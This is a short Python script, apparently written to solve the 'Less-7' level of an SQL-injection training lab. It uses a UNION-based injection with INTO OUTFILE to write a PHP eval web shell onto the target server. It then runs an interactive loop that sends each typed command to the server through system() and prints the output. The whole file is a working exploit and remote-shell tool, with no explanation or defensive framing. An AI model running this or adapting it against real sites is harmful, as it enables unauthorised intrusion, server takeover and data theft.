import requests
from bs4 import BeautifulSoup

class Less7(object):

    def __init__(self,url,level,shell):
        self.url = url
        self.level = level
        self.shell = shell

    def Less_7(self):
        url = f"""?id=1')) union select 1,2,'<?php @eval($_GET["mima"])?>' into outfile "{self.shell}" --+"""
        requests.get(self.url+url)
        rep = requests.get(self.url+self.shell.split("/")[-1])
        if rep.ok:
            while True:
                cmd = input("shell:")
                url = self.url+self.shell.split("/")[-1]+"?mima=system('"+cmd+"');"
                rep = requests.get(url)
                print(rep.text)

